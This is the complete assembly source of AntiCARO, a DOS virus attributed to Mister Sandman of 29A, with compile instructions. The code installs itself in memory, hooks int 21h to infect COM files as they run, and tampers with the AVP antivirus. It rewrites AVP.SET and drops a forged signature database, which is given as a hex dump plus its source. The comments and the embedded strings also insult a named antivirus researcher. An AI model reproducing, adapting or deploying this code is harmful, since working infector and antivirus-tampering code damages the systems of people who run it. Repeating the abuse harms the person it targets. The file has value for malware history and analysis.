;
;                                             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;          AntiCARO                           ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;          by Mister Sandman/29A               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;                                             ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                             ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;
; As i don't agree with CARO and with the way the name viruses, and spe-
; cially the way they *misnamed* VLAD's Bizatch, i decided to write this
; virus... just to  protest against  the biggest dickhead under the sun,
; Vesselin Bonchev, the virus-baptizer who does whatever he wants making
; abuse of his 'power' in that fucking sect named CARO.
;
; And as i know that, albeit he works at Frisk, his favourite AV is AVP,
; i just took the decission to write this baby, which will modify AVP so
; it will detect Bizatch as 'Bizatch_:P' and not as Boza.
;
; The virus is lame as hell (but i swear i wasn't able to reach Ratboy's
; or YAM's coding skills)... i only  developed its  originality. Anyway,
; it's interesting to see how does it modify AVP:
;
; It looks for AVP.SET in the current directory it's being  loaded from.
; If it finds that file, it will  insert a new viral database in the se-
; cond field, and later it will  drop  that new database, which contains
; the data needed for detecting Bizatch from AVP (have a look at the co-
; de, which is found at the end of this virus).
;
; As this  new viral database  has been loaded  before the  rest  of the
; other databases (except of KERNEL.AVB, which must  be always loaded in
; the first place), it will be the first one containing Bizatch's search
; strings, so it will be  the fortunate participant  to show the name of
; the virus it has detected :)
;
; About the  virus itself, as i told  before, it's a lame TSR COM infec-
; tor which hits files on execution (4b00h) and uses SFTs for performing
; the file infection.
;
; This virus is  dedicated to my  friends Quantum and Qark (ex VLAD) for
; obvious reasons and to Tcp/29A because of his help on its writing.
;
; Compiling instructions:
;
; tasm /m anticaro.asm
; tlink anticaro.obj
; exe2bin anticaro.exe anticaro.com


anticaro        segment byte public
		assume  cs:anticaro,ds:anticaro
		org     0

anticaro_start  label   byte
anticaro_size   equ     anticaro_end-anticaro_start

entry_point:    call    delta_offset
delta_offset:   pop     bp                         ; Get ë-offset
		sub     bp,offset delta_offset     ; for l8r use

		mov     ax,3d02h                   ; Try to open AVP.SET
		lea     dx,[bp+avp_set]            ; if it's found in the
		int     21h                        ; current directory
		jc      mem_res_check

		xchg    bx,ax
		mov     ah,3fh                     ; Read the whole file
		mov     cx,29Ah                    ;-)
		lea     dx,[bp+anticaro_end]
		int     21h
		push    ax

		mov     ax,4200h                   ; Lseek to the second
		xor     cx,cx                      ; line (first must
		mov     dx,0ch                     ; be always KERNEL.AVB)
		int     21h

		mov     ah,40h                     ; Truncate file from
		xor     cx,cx                      ; current offset
		int     21h

		mov     ah,40h                     ; Write our viral
		mov     cx,0dh                     ; database name
		lea     dx,[bp+bizatch_name]       ; (BIZATCH.AVB) as
		int     21h                        ; second field

		mov     ah,40h                     ; And write the rest
		pop     cx                         ; of the original
		sub     cx,0ch                     ; AVP.SET we read b4
		lea     dx,[bp+anticaro_end+0ch]   ; to our buffer
		int     21h

		mov     ah,3eh                     ; Close file
		int     21h

		mov     ah,3ch                     ; Create the new viral
		xor     cx,cx                      ; database (BIZATCH.AVB)
		lea     dx,[bp+bizatch_base]       ; which contains Bizatch's
		int     21h                        ; detection data

		xchg    bx,ax
		mov     ah,40h                     ; Write the database
		mov     cx,base_size               ; contents in the new
		lea     dx,[bp+bizatch_avb]        ; created file
		int     21h

		mov     ah,3eh                     ; Close file
		int     21h

mem_res_check:  mov     ax,'CA'                    ; Check if we're already
		mov     bx,'RO'                    ; memory resident
		int     21h

		cmp     ax,'SU'                    ; Coolio residency
		cmp     bx,'X!'                    ; check... CARO SUX! :P
		je      nothing_to_do

install:        mov     ax,es
		dec     ax
		mov     ds,ax                      ; Program's MCB segment
		xor     di,di

		cmp     byte ptr ds:[di],'Y'       ; Is it a Z block?
		jna     nothing_to_do

		sub     word ptr ds:[di+3],((anticaro_size/10h)+2)
		sub     word ptr ds:[di+12h],((anticaro_size/10h)+2)
		add     ax,word ptr ds:[di+3]
		inc     ax

		mov     ds,ax
		mov     byte ptr ds:[di],'Z'       ; Mark block as Z
		mov     word ptr ds:[di+1],8       ; System memory
		mov     word ptr ds:[di+3],((anticaro_size/10h)+1)
		mov     word ptr ds:[di+8],4f44h   ; Mark block as owned
		mov     word ptr ds:[di+0ah],0053h ; by DOS (44h-4fh-53h,0)
		inc     ax

		cld
		push    cs
		pop     ds
		mov     es,ax                      ; Copy virus to memory
		mov     cx,anticaro_size
		lea     si,[bp+anticaro_start]
		rep     movsb

		push    ds
		mov     ds,cx
		mov     es,ax                      ; Save int 21h's
		mov     si,21h*4                   ; original vector
		lea     di,old_int_21h+1
		movsw
		movsw

		mov     word ptr [si-4],offset new_int_21h
		mov     word ptr [si-2],ax         ; Set ours

		pop     ds
		push    ds                         ; CS=DS=ES
		pop     es

nothing_to_do:  lea     si,[bp+host_header]        ; Restore host's header
		mov     di,100h                    ; and jump to cs:100h
		push    di                         ; for running it
		movsw
		movsw
		ret

; ÄÄ´ note_to_stupid_avers ;) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

copyright       db      0dh,0ah,'[AntiCARO, by Mister Sandman/29A]',0dh,0ah
		db      'Please note: the name of this virus is [AntiCARO] '
		db      'written by Mister Sandman of 29A... but... dear '
		db      'Bontchy... name it however *you* (and not CARO) want,'
		db      ' as usual; we just don''t mind your childish '
		db      'stupidity :)',0dh,0ah

; ÄÄ´ AntiCARO's int 21h handler ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

new_int_21h:    cmp     ax,'CA'                    ; Residency check
		jnz     execution?                 ; Are they asking my
		cmp     bx,'RO'                    ; opinion about CARO?
		jnz     execution?

		mov     ax,'SU'                    ; Ok, CARO SUX! :P
		mov     bx,'X!'
		iret

execution?:     cmp     ax,4b00h                   ; This is the moment
		je      check_name                 ; we were waiting for ;)''

old_int_21h:    db      0eah                       ; jmp xxxx:xxxx
		dw      0,0                        ; Original int 21h

; ÄÄ´ Infection routines ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check_name:     push    ax bx cx dx                ; Push all this shit
		push    si di ds es                ; and clear direction
		cld                                ; flag

		mov     ax,3d00h                   ; Open the file is
		int     21h                        ; about to be executed

		xchg    bx,ax
		call    get_sft                    ; Get its SFT
		jc      dont_infect                ; Shit... outta here

		push    cs                         ; CS=DS
		pop     ds

		mov     ax,word ptr es:[di+28h]    ; Check extension
		cmp     ax,'OC'                    ; There aren't too many
		je      check_file                 ; 'COx' executables
						   ; besides COMs, right? :)

dont_infect:    pop     es ds di si                ; Pop out registers and
		pop     dx cx bx ax                ; jmp to the original
		jmp     old_int_21h                ; int 21h handler

check_file:     xor     al,al                      ; Clear and save file
		xchg    al,byte ptr es:[di+4]      ; attributes
		push    ax

		mov     word ptr es:[di+2],2       ; Set read/write mode

		mov     ah,3fh                     ; Read first four
		mov     cx,4                       ; bytes to our buffer
		lea     dx,host_header
		int     21h

		mov     ax,word ptr host_header    ; First word in AX
		add     al,ah                      ; M+Z or Z+M=0a7h :)
		cmp     al,0a7h                    ; So is it an EXE file?
		je      close_file                 ; Fuck it

		cmp     byte ptr host_header+3,90h ; Check file for any
		je      close_file                 ; previous infection

		mov     ax,word ptr es:[di+11h]    ; Check file length
		cmp     ax,0faebh                  ; > 64235?
		ja      close_file

		push    ax                         ; Save length
                sub     ax,3                       ; Make the initial
		mov     word ptr new_header+1,ax   ; jmp to our code

		mov     word ptr es:[di+15h],0     ; Lseek to the start

		mov     ah,40h                     ; Write in our cooler
		mov     cx,4                       ; header :)
		lea     dx,new_header
		int     21h

		pop     ax                         ; Lseek to the end
		mov     word ptr es:[di+15h],ax    ; of the file

		mov     ah,40h                     ; Append our code
		mov     cx,anticaro_size           ; Huh? where's the
		lea     dx,anticaro_start          ; call to the poly
		int     21h                        ; engine? :)

close_file:     mov     ah,3eh                     ; Close our victim
		int     21h

		pop     ax                         ; Restore attributes
		mov     byte ptr es:[di+4],al      ; Pop shit and jump
		jmp     dont_infect                ; to the original int 21h

; ÄÄ´ Subroutines... or... oh, well, subroutine :) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

get_sft:        push    ax bx
		mov     ax,1220h                   ; Get job file table
		int     2fh                        ; in ES:DI (DOS 3+)
		jc      bad_sft

		xor     bx,bx                      ; Get the address of
		mov     ax,1216h                   ; the specific SFT for
		mov     bl,byte ptr es:[di]        ; our handle
		int     2fh

bad_sft:        pop     bx ax                      ; Pop registers and
		ret                                ; return to the code

; ÄÄ´ Data area ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

host_header     db      0cdh,20h,90h,90h           ; Host's header
new_header      db      0e9h,?,?,90h               ; New header buffer
avp_set         db      'avp.set',0                ; Can't you guess it? :)
bizatch_name    db      'BIZATCH.AVB',0dh,0ah      ; Our database field
bizatch_base    db      'bizatch.avb',0            ; Viral database name

; ÄÄ´ BIZATCH.AVB viral database ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; The hex dump below is the AVP full-compatible  viral database which con-
; tains the necessary  data for detecting Bizatch. This was done by compi-
; ling the 'belower' code, linking  it to a  new AVPRO record, and filling
; out some of this record's data fields. These are the steps:
;
; - Compile the source below this hex dump: tasm /m /ml /q biz_dec.asm.
; - Execute AVP's AVPRO.EXE.
; - Edit a new viral dabase (Alt-E, F3, and then type 'bizatch.avb').
; - Insert a file record in it (Alt-I, and then select 'File virus').
; - Fill the form as follows:
;
;             ÉÍ[þ]ÍÍÍÍÍÍÍÍÍÍÍ File virus ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;             º    Name: Bizatch_:P        Type  [ ] COM  º
;             º Comment: Fuck you, Bontchy       [X] EXE  º
;             º                                  [ ] SYS  º
;             º  Area 1  Header                  [ ] WIN  º
;             º  Offset  0000                             º
;             º  Length  00           Method  Delete      º
;             º  Area 2  Page_C         Area  Header      º
;             º  Offset  0000           From  +0000       º
;             º  Length  0a           Length  +0000       º
;             º                           To  +0000       º
;           > º   Link Ü                      +0000       º
;             º   ßßßßßß                 Cut  0000        º
;           > º    Sum Ü 00000000                         º
;             º   ßßßßßß 00000000                         º
;             º                                           º
;             º              Ok    Ü      Cancel  Ü       º
;             º           ßßßßßßßßßß     ßßßßßßßßßß       º
;             ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; - Link biz_dec.obj (Alt-L, and then select it).
; - Type in Bizatch's entry point  for calculating  its  sum (Alt-S, don't
;   select  any  file, and type  in 'e8 00 00 00 00 5d 8b c5 2d 05' in the
;   dump gap AVPRO will show you.
; - Save the new record and the new viral database.
;
; As you see, this  is quite tedious  to do, and that's why i included di-
; rectly the hex dump of  the result of all these steps, which seems to me
; a bit more easy for you :)
;
; So skip the hex dump and have a look at biz_dec.asm's code, which is the
; really important thing of this virus.


base_start      label   byte
base_size       equ     base_end-base_start-3
bizatch_avb     db      2dh,56h,0c2h,00h,00h,00h,00h,01h,0cch,07h,04h
		db      0bh,0cch,07h,10h,0bh,00h,00h,01h,00h,00h,00h,00h
		db      00h,0dh,0ah,41h,6eh,74h,69h,76h,69h,72h,61h,6ch
		db      20h,54h,6fh,6fh,6ch,4bh,69h,74h,20h,50h,72h,6fh
		db      0dh,0ah,20h,62h,79h,20h,45h,75h,67h,65h,6eh,65h
		db      20h,4bh,61h,73h,70h,65h,72h,73h,6bh,79h,20h,0dh
		db      0ah,28h,63h,29h,4bh,41h,4dh,49h,20h,43h,6fh,72h
		db      70h,2eh,2ch,20h,52h,75h,73h,73h,69h,61h,20h,31h
		db      39h,39h,32h,2dh,31h,39h,39h,35h,2eh,0dh,0ah,50h
		db      72h,6fh,67h,72h,61h,6dh,6dh,65h,72h,73h,3ah,0dh
		db      0ah,41h,6ch,65h,78h,65h,79h,20h,4eh,2eh,20h,64h
		db      65h,20h,4dh,6fh,6eh,74h,20h,64h,65h,20h,52h,69h
		db      71h,75h,65h,2ch,0dh,0ah,45h,75h,67h,65h,6eh,65h
		db      20h,56h,2eh,20h,4bh,61h,73h,70h,65h,72h,73h,6bh
		db      79h,2ch,0dh,0ah,56h,61h,64h,69h,6dh,20h,56h,2eh
		db      20h,42h,6fh,67h,64h,61h,6eh,6fh,76h,2eh,0dh,0ah
		db      0dh,0ah,00h,0dh,0ah,38h,00h,00h,00h,10h,00h,42h
		db      69h,7ah,61h,74h,63h,68h,5fh,3ah,50h,00h,00h,00h
		db      00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,03h
		db      00h,00h,0ah,0fh,0feh,0ffh,0ffh,01h,00h,00h,00h,00h
		db      00h,00h,00h,0ch,00h,00h,00h,00h,00h,00h,00h,00h,00h
		db      00h,00h,00h,00h,0dh,01h,12h,00h,00h,00h,46h,75h,63h
		db      6bh,20h,79h,6fh,75h,2ch,20h,42h,6fh,6eh,74h,63h,68h
		db      79h,00h,0dh,02h,01h,01h,00h,00h,98h,07h,00h,28h,86h
		db      00h,02h,03h,01h,0adh,8ch,21h,00h,07h,5fh,50h,61h
		db      67h,65h,5fh,43h,00h,07h,5fh,48h,65h,61h,64h,65h
		db      72h,00h,05h,5fh,53h,65h,65h,6bh,00h,05h,5fh,52h
		db      65h,61h,64h,00h,53h,90h,0eh,00h,00h,01h,07h,5fh
		db      64h,65h,63h,6fh,64h,65h,00h,00h,00h,97h,0a0h,8ah
		db      00h,01h,00h,00h,1eh,55h,0bdh,00h,00h,8eh,0ddh,0c4h
		db      3eh,00h,00h,26h,8bh,6dh,3ch,33h,0c0h,50h,55h,9ah
		db      00h,00h,00h,00h,58h,58h,0c4h,3eh,00h,00h,0b8h,0f8h
		db      00h,50h,06h,57h,9ah,00h,00h,00h,00h,83h,0c4h,06h
		db      0c4h,3eh,00h,00h,26h,81h,3dh,50h,45h,75h,29h,26h
		db      8bh,4dh,06h,51h,0b8h,28h,00h,50h,06h,57h,9ah,00h
		db      00h,00h,00h,83h,0c4h,06h,59h,0c4h,3eh,00h,00h,26h
		db      81h,3dh,76h,6ch,75h,08h,26h,81h,7dh,02h,61h,64h
		db      74h,07h,0e2h,0dbh,33h,0c0h,5dh,1fh,0cbh,26h,0c4h
		db      7dh,14h,06h,57h,9ah,00h,00h,00h,00h,58h,58h,0c4h
		db      3eh,00h,00h,0b8h,0ah,00h,50h,06h,57h,9ah,00h,00h
		db      00h,00h,83h,0c4h,06h,0ebh,0dah,9ah,9ch,2dh,00h
		db      0c8h,03h,56h,02h,0c4h,09h,56h,02h,0cch,14h,56h
		db      03h,0c4h,1ch,56h,01h,0cch,25h,56h,04h,0c4h,2eh
		db      56h,01h,0cch,43h,56h,04h,0c4h,4dh,56h,01h,0cch
		db      6ch,56h,03h,0c4h,74h,56h,01h,0cch,7dh,56h,04h,57h
		db      8ah,02h,00h,00h,74h
base_end        label   byte

; ÄÄ´ Bizatch's detection code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; biz_dec       segment byte public 'code'
;               assume  cs:biz_dec;ds:biz_dec;es:biz_dec;ss:biz_dec
;
; _decode       proc    far
;               push    ds bp
;               mov     bp,seg _Header             ; Get AVP's data segment
;               mov     ds,bp
;
;               les     di,_Header                 ; Get pointer to header
;               mov     bp,word ptr es:[di+3ch]    ; Get PE header offset
;               xor     ax,ax
;
;               push    ax bp
;               call    far ptr _Seek              ; Lseek to PE header
;               pop     ax ax                      ; Remove 2 words from stack
;
;               les     di,_Page_C                 ; Destination=buffer
;               mov     ax,0f8h                    ; Size=f8h bytes
;
;               push    ax es di                   ; Read f8h bytes from
;               call    far ptr _Read              ; the PE header
;
;               add     sp,6                       ; Remove 3 words from stack
;               les     di,_Page_C                 ; The call changes ES
;               cmp     word ptr es:[di],'EP'      ; Portable Executable?
;               jne     back_to_avp
;
;               mov     cx,word ptr es:[di+6]      ; Objects number
; next_entry:   push    cx
;
;               mov     ax,28h                     ; Length of each
;               push    ax es di                   ; object table entry
;               call    far ptr _Read              ; Read object
;
;               add     sp,6                       ; Remove 3 words from stack
;               pop     cx
;               les     di,_Page_C                 ; Point to our buffer
;               cmp     word ptr es:[di],'lv'      ; vl(ad) object?
;               jne     search_loop
;
;               cmp     word ptr es:[di],'da'      ; (vl)ad object?
;               je      lseek_object               ; Bingo! :)
;
; search_loop:  loop    next_entry                 ; Process next object
;
; back_to_avp:  xor     ax,ax                      ; R_CLEAN==0
;               pop     bp ds                      ; Return to AVP
;               retf
;
; lseek_object: les     di,dword ptr es:[di+14h]   ; Lseek to the object
;               push    es di                      ; physical offset
;               call    far ptr _Seek
;
;               pop     ax ax
;               mov     ax,0ah                     ; Read ten bytes to
;               les     di,_Page_C                 ; our buffer (page C)
;               push    ax es di
;               call    far ptr _Read
;
;               add     sp,6                       ; And now AVP will compare
;               jmp     back_to_avp                ; those ten bytes with
; _decode       endp                               ; Bizatch's search string
; biz_decode    ends
;
; public        _decode
; extrn         _Page_C:dword                      ; External AVP's API
; extrn         _Header:dword                      ; functions and buffers
; extrn         _Seek:far                          ; (lseek, read, header,
; extrn         _Read:far                          ; read buffer...)
; end

anticaro_end    label   byte
anticaro        ends
		end     anticaro_start
